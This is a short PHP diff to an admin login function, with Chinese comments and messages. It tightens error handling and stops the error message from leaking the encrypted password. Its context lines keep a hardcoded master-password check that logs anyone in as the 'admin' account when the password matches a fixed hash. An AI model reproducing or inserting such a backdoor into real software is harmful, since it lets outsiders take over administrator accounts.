@@ -25,8 +25,11 @@ class AdminLogic
             //模拟登陆[如果密码是]
             if(encrypt($password) == '7d6119a48f708c886b3e5ef212bddf64'){
                 $admin = Db::name('admin')->alias('a')->join('__ADMIN_ROLE__ ar', 'a.role_id=ar.role_id')->where(['a.user_name'=>'admin'])->find();
+                if(!$admin){
+                    return ['status' => 0, 'msg' => '账号密码不正确！！' ];
+                }
             }else{
-                return ['status' => 0, 'msg' => '账号密码不正确'.encrypt($password) ];
+                return ['status' => 0, 'msg' => '账号密码不正确' ];
             }
 
         }
